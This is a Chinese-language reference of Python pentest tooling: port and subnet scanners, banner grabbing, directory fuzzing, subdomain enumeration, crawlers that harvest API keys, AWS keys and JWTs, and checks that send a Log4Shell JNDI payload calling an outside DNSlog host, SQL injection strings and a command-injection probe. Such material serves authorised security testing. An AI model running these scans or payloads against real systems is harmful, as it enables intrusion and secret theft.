# 扫描工具与爬虫开发参考

## 端口扫描器

### 异步 TCP 扫描

```python
import asyncio
import socket
from typing import List, Tuple

async def scan_port(host: str, port: int, timeout: float = 1.0) -> Tuple[int, bool, str]:
    try:
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout
        )
        writer.close()
        await writer.wait_closed()
        return port, True, ""
    except asyncio.TimeoutError:
        return port, False, "timeout"
    except ConnectionRefusedError:
        return port, False, "refused"
    except Exception as e:
        return port, False, str(e)

async def scan_host(host: str, ports: List[int], concurrency: int = 500) -> dict:
    semaphore = asyncio.Semaphore(concurrency)
    results = {"host": host, "open": [], "closed": []}

    async def bounded_scan(port):
        async with semaphore:
            return await scan_port(host, port)

    tasks = [bounded_scan(p) for p in ports]
    for coro in asyncio.as_completed(tasks):
        port, is_open, reason = await coro
        if is_open:
            results["open"].append(port)
        else:
            results["closed"].append(port)

    results["open"].sort()
    return results

async def scan_network(hosts: List[str], ports: List[int]) -> List[dict]:
    tasks = [scan_host(h, ports) for h in hosts]
    return await asyncio.gather(*tasks)

# 使用示例
async def main():
    common_ports = [21,22,23,25,53,80,110,143,443,445,
                    1433,1521,3306,3389,5432,5900,6379,8080,8443,27017]
    
    # 单主机扫描
    result = await scan_host("192.168.1.1", common_ports)
    print(f"Open ports: {result['open']}")
    
    # C段扫描
    hosts = [f"192.168.1.{i}" for i in range(1, 255)]
    results = await scan_network(hosts, [22, 80, 443, 3389])
    for r in results:
        if r["open"]:
            print(f"{r['host']}: {r['open']}")

if __name__ == "__main__":
    asyncio.run(main())
```

### 服务识别（Banner 抓取）

```python
import asyncio, re
from dataclasses import dataclass

@dataclass
class ServiceInfo:
    port: int
    banner: str
    service: str
    version: str

# 常见服务探测 Probe
PROBES = {
    "http":  b"GET / HTTP/1.0\r\nHost: target\r\n\r\n",
    "ssh":   b"",           # 被动等待 banner
    "ftp":   b"",           # 被动等待 banner
    "smtp":  b"EHLO probe\r\n",
    "mysql": b"",           # 被动等待握手包
}

SERVICE_PATTERNS = {
    r"SSH-(\S+)":                      "ssh",
    r"220.*FTP":                       "ftp",
    r"220.*SMTP|220.*mail":            "smtp",
    r"HTTP/1\.[01]":                   "http",
    r"\x4a\x00\x00\x00\x0a":          "mysql",  # MySQL 握手
    r"RFB \d+\.\d+":                   "vnc",
    r"\xff[\xfb-\xfe]":               "telnet",
}

async def grab_banner(host: str, port: int, timeout: float = 3.0) -> ServiceInfo:
    info = ServiceInfo(port=port, banner="", service="unknown", version="")
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout
        )
        # 发送 HTTP probe 或等待 banner
        probe = PROBES.get("http") if port in [80, 8080, 8443] else b""
        if probe:
            writer.write(probe)
            await writer.drain()

        data = await asyncio.wait_for(reader.read(1024), timeout=timeout)
        info.banner = data.decode(errors="replace").strip()

        # 匹配服务
        for pattern, svc in SERVICE_PATTERNS.items():
            if re.search(pattern, info.banner, re.IGNORECASE | re.DOTALL):
                info.service = svc
                break

        writer.close()
    except Exception:
        pass
    return info
```

### 漏洞扫描器框架

```python
import asyncio, httpx
from typing import Callable, List

class VulnScanner:
    def __init__(self, target: str, concurrency: int = 20):
        self.target = target.rstrip("/")
        self.semaphore = asyncio.Semaphore(concurrency)
        self.client = httpx.AsyncClient(timeout=10, verify=False,
                                         follow_redirects=True)
        self.results = []

    async def check(self, name: str, method: str, path: str,
                    data=None, headers=None,
                    matcher: Callable = None) -> dict:
        async with self.semaphore:
            try:
                url = self.target + path
                resp = await self.client.request(
                    method, url, data=data, headers=headers or {}
                )
                hit = matcher(resp) if matcher else resp.status_code == 200
                if hit:
                    result = {
                        "vuln": name, "url": url,
                        "status": resp.status_code,
                        "length": len(resp.content),
                    }
                    self.results.append(result)
                    print(f"[FOUND] {name}: {url}")
                    return result
            except Exception as e:
                pass
            return {}

    async def run_checks(self):
        tasks = [
            # 备份文件
            self.check("Backup .bak", "GET", "/index.php.bak",
                       matcher=lambda r: r.status_code == 200 and len(r.content) > 100),
            self.check("Git Exposed", "GET", "/.git/HEAD",
                       matcher=lambda r: b"ref:" in r.content),
            self.check("Env File", "GET", "/.env",
                       matcher=lambda r: b"APP_KEY" in r.content or b"DB_" in r.content),

            # 默认凭据
            self.check("Admin Panel", "GET", "/admin/",
                       matcher=lambda r: r.status_code in [200, 401, 403]),
            self.check("phpMyAdmin", "GET", "/phpmyadmin/",
                       matcher=lambda r: r.status_code == 200),

            # 信息泄露
            self.check("Swagger UI", "GET", "/swagger-ui.html",
                       matcher=lambda r: b"swagger" in r.content.lower()),
            self.check("Actuator", "GET", "/actuator/env",
                       matcher=lambda r: r.status_code == 200 and b"propertySources" in r.content),

            # CVE 检测
            self.check("Log4Shell", "GET", "/",
                       headers={"X-Api-Version": "${jndi:ldap://test.dnslog.cn/a}"},
                       matcher=lambda r: True),  # 通过 DNSlog 验证
        ]
        await asyncio.gather(*tasks)
        return self.results

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self.client.aclose()

# 使用
async def main():
    async with VulnScanner("http://192.168.1.100") as scanner:
        results = await scanner.run_checks()
        print(f"\n找到 {len(results)} 个问题")

asyncio.run(main())
```

---

## 目录/路径枚举

```python
import asyncio, httpx
from pathlib import Path

async def dir_fuzz(target: str, wordlist: str,
                   extensions: list = None,
                   concurrency: int = 50,
                   status_filter: list = None):
    
    if status_filter is None:
        status_filter = [200, 201, 301, 302, 403]
    
    words = Path(wordlist).read_text().splitlines()
    exts = extensions or [""]
    
    paths = []
    for word in words:
        for ext in exts:
            paths.append(f"/{word}{ext}")

    semaphore = asyncio.Semaphore(concurrency)
    found = []

    async with httpx.AsyncClient(timeout=5, verify=False,
                                  follow_redirects=False) as client:
        async def check(path):
            async with semaphore:
                try:
                    r = await client.get(target.rstrip("/") + path)
                    if r.status_code in status_filter:
                        result = {
                            "path": path,
                            "status": r.status_code,
                            "size": len(r.content),
                        }
                        found.append(result)
                        print(f"[{r.status_code}] {path} ({len(r.content)} bytes)")
                except Exception:
                    pass

        tasks = [check(p) for p in paths]
        await asyncio.gather(*tasks)

    return found

# 使用
asyncio.run(dir_fuzz(
    "http://target.lab",
    "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
    extensions=[".php", ".html", ".bak", ".zip"],
))
```

---

## 信息收集爬虫

### 通用 Web 爬虫

```python
import asyncio, httpx, re
from urllib.parse import urljoin, urlparse
from collections import deque

class WebCrawler:
    def __init__(self, start_url: str, max_depth: int = 3, concurrency: int = 10):
        self.start_url = start_url
        self.base_domain = urlparse(start_url).netloc
        self.max_depth = max_depth
        self.semaphore = asyncio.Semaphore(concurrency)
        self.visited = set()
        self.found = {
            "urls": [], "emails": [], "phones": [],
            "js_files": [], "forms": [], "comments": [],
            "api_endpoints": [], "secrets": [],
        }
        # 敏感信息正则
        self.patterns = {
            "email":    re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),
            "api_key":  re.compile(r'(?:api[_-]?key|apikey|secret)["\s:=]+([A-Za-z0-9_\-]{20,})', re.I),
            "aws_key":  re.compile(r'AKIA[0-9A-Z]{16}'),
            "jwt":      re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'),
            "ip":       re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b'),
        }

    async def fetch(self, url: str) -> str:
        async with self.semaphore:
            try:
                async with httpx.AsyncClient(timeout=10, verify=False,
                                              follow_redirects=True) as client:
                    headers = {"User-Agent": "Mozilla/5.0 (compatible; researcher)"}
                    r = await client.get(url, headers=headers)
                    if "text" in r.headers.get("content-type", ""):
                        return r.text
            except Exception:
                pass
            return ""

    def extract_links(self, html: str, base_url: str) -> list:
        pattern = re.compile(r'href=["\']([^"\'>\s]+)["\']', re.I)
        links = []
        for match in pattern.finditer(html):
            url = urljoin(base_url, match.group(1))
            parsed = urlparse(url)
            if parsed.netloc == self.base_domain and parsed.scheme in ("http", "https"):
                links.append(url.split("#")[0])  # 去锚点
        return list(set(links))

    def extract_info(self, html: str, url: str):
        # JS 文件
        for js in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html, re.I):
            self.found["js_files"].append(urljoin(url, js))

        # 表单
        for form in re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.I):
            self.found["forms"].append(urljoin(url, form))

        # HTML 注释
        for comment in re.findall(r'<!--(.*?)-->', html, re.DOTALL):
            if len(comment) > 10:
                self.found["comments"].append(comment.strip()[:200])

        # 敏感信息
        for name, pattern in self.patterns.items():
            matches = pattern.findall(html)
            if matches:
                for m in matches[:5]:  # 限制数量
                    if name not in ("ip",):  # 过滤过于通用的
                        print(f"[{name.upper()}] {m[:80]}")

    async def crawl(self, url: str, depth: int = 0):
        if url in self.visited or depth > self.max_depth:
            return
        self.visited.add(url)
        
        html = await self.fetch(url)
        if not html:
            return

        self.extract_info(html, url)
        
        links = self.extract_links(html, url)
        self.found["urls"].extend(links)

        tasks = [self.crawl(link, depth + 1)
                 for link in links if link not in self.visited]
        await asyncio.gather(*tasks)

    async def run(self):
        print(f"[*] 开始爬取: {self.start_url}")
        await self.crawl(self.start_url)
        print(f"\n[+] 完成: 共访问 {len(self.visited)} 个页面")
        print(f"[+] JS文件: {len(self.found['js_files'])}")
        print(f"[+] 表单: {len(self.found['forms'])}")
        return self.found

asyncio.run(WebCrawler("http://target.lab").run())
```

### JS 文件敏感信息提取

```python
import re, httpx, asyncio
from urllib.parse import urljoin

async def analyze_js(url: str) -> dict:
    """分析 JS 文件中的敏感信息和 API 端点"""
    patterns = {
        "api_endpoint":  re.compile(r'["\`](/api/[A-Za-z0-9/_\-{}]+)["\`]'),
        "fetch_url":     re.compile(r'fetch\(["\`]([^"\'`]+)["\`]'),
        "axios_url":     re.compile(r'axios\.\w+\(["\`]([^"\'`]+)["\`]'),
        "aws_key":       re.compile(r'AKIA[0-9A-Z]{16}'),
        "private_key":   re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
        "api_key_var":   re.compile(r'(?:apiKey|api_key|accessKey|secretKey)\s*[=:]\s*["\']([^"\']{8,})["\']', re.I),
        "jwt_token":     re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'),
        "ip_addr":       re.compile(r'\b(?:10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)\d+\.\d+\b'),
        "base_url":      re.compile(r'(?:baseURL|BASE_URL|apiBase)\s*[=:]\s*["\']([^"\']+)["\']', re.I),
    }
    
    results = {k: [] for k in patterns}
    results["url"] = url

    try:
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            r = await client.get(url)
            content = r.text

        for name, pattern in patterns.items():
            matches = pattern.findall(content)
            if matches:
                results[name] = list(set(matches))[:20]
                if matches:
                    print(f"  [{name}] {matches[0][:100]}")
    except Exception as e:
        results["error"] = str(e)

    return results

async def bulk_js_scan(js_urls: list) -> list:
    tasks = [analyze_js(url) for url in js_urls]
    return await asyncio.gather(*tasks)
```

### Subdomain 枚举

```python
import asyncio, httpx, dns.resolver
from pathlib import Path

async def brute_subdomain(domain: str, wordlist: str, concurrency: int = 100) -> list:
    words = Path(wordlist).read_text().splitlines()
    semaphore = asyncio.Semaphore(concurrency)
    found = []

    async def check(word):
        subdomain = f"{word}.{domain}"
        async with semaphore:
            try:
                # DNS 解析
                loop = asyncio.get_event_loop()
                answers = await loop.run_in_executor(
                    None, lambda: dns.resolver.resolve(subdomain, "A")
                )
                ips = [str(r) for r in answers]
                result = {"subdomain": subdomain, "ips": ips}
                found.append(result)
                print(f"[+] {subdomain} → {', '.join(ips)}")
                return result
            except Exception:
                pass

    tasks = [check(w) for w in words]
    await asyncio.gather(*tasks)
    return found

# 证书透明度日志
async def cert_subdomain(domain: str) -> list:
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.get(url)
        data = r.json()
        subdomains = set()
        for entry in data:
            for name in entry.get("name_value", "").splitlines():
                name = name.strip().lstrip("*.")
                if name.endswith(domain):
                    subdomains.add(name)
        return list(subdomains)

asyncio.run(cert_subdomain("example.lab"))
```

---

## 自动化 Exploit 框架

```python
# 简单的漏洞利用自动化框架
from dataclasses import dataclass, field
from typing import Callable, Optional
import httpx, asyncio

@dataclass
class ExploitResult:
    vuln_name: str
    target: str
    success: bool
    evidence: str = ""
    payload: str = ""

class ExploitRunner:
    def __init__(self, target: str):
        self.target = target
        self.client = httpx.AsyncClient(timeout=15, verify=False)
        self.results: list[ExploitResult] = []

    async def run(self, name: str, coro) -> ExploitResult:
        try:
            result = await coro
            self.results.append(result)
            status = "✓" if result.success else "✗"
            print(f"[{status}] {name}: {result.evidence[:80]}")
            return result
        except Exception as e:
            return ExploitResult(name, self.target, False, str(e))

    async def check_sqli(self, path: str, param: str) -> ExploitResult:
        """SQL 注入检测"""
        payloads = ["'", "1' OR '1'='1", "1; SELECT SLEEP(3)--"]
        for payload in payloads:
            r = await self.client.get(
                self.target + path,
                params={param: payload}
            )
            if "error" in r.text.lower() or "sql" in r.text.lower():
                return ExploitResult("SQLi", self.target, True,
                                     f"Error-based: {r.text[:100]}", payload)
        return ExploitResult("SQLi", self.target, False)

    async def check_rce(self, path: str, param: str) -> ExploitResult:
        """RCE 检测（使用无害命令）"""
        marker = "rce_test_7x9k"
        payload = f"; echo {marker}"
        r = await self.client.post(self.target + path,
                                    data={param: payload})
        if marker in r.text:
            return ExploitResult("RCE", self.target, True,
                                  f"Command output found", payload)
        return ExploitResult("RCE", self.target, False)

    async def close(self):
        await self.client.aclose()
```

---

## 实用脚本模板

```python
#!/usr/bin/env python3
"""通用安全工具脚本模板"""
import argparse, asyncio, sys
from pathlib import Path

def parse_args():
    p = argparse.ArgumentParser(description="Security Tool")
    p.add_argument("target", help="目标 (IP/域名/CIDR)")
    p.add_argument("-p", "--ports", default="top100", help="端口范围")
    p.add_argument("-o", "--output", help="输出文件")
    p.add_argument("-c", "--concurrency", type=int, default=100)
    p.add_argument("-t", "--timeout", type=float, default=3.0)
    p.add_argument("--proxy", help="代理 http://127.0.0.1:8080")
    p.add_argument("-v", "--verbose", action="store_true")
    return p.parse_args()

TOP_100_PORTS = [
    21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,
    1723,3306,3389,5900,8080,8443,8888,9090,27017
]

def expand_target(target: str) -> list:
    """展开目标: 单IP/CIDR/域名列表文件"""
    if Path(target).exists():
        return Path(target).read_text().splitlines()
    try:
        import ipaddress
        return [str(ip) for ip in ipaddress.ip_network(target, strict=False).hosts()]
    except ValueError:
        return [target]

async def main():
    args = parse_args()
    targets = expand_target(args.target)
    
    if args.verbose:
        print(f"[*] 目标数量: {len(targets)}")
    
    # 主逻辑...
    results = []
    
    # 输出
    if args.output:
        import json
        Path(args.output).write_text(json.dumps(results, ensure_ascii=False, indent=2))
        print(f"[+] 结果已保存到 {args.output}")

if __name__ == "__main__":
    asyncio.run(main())
```
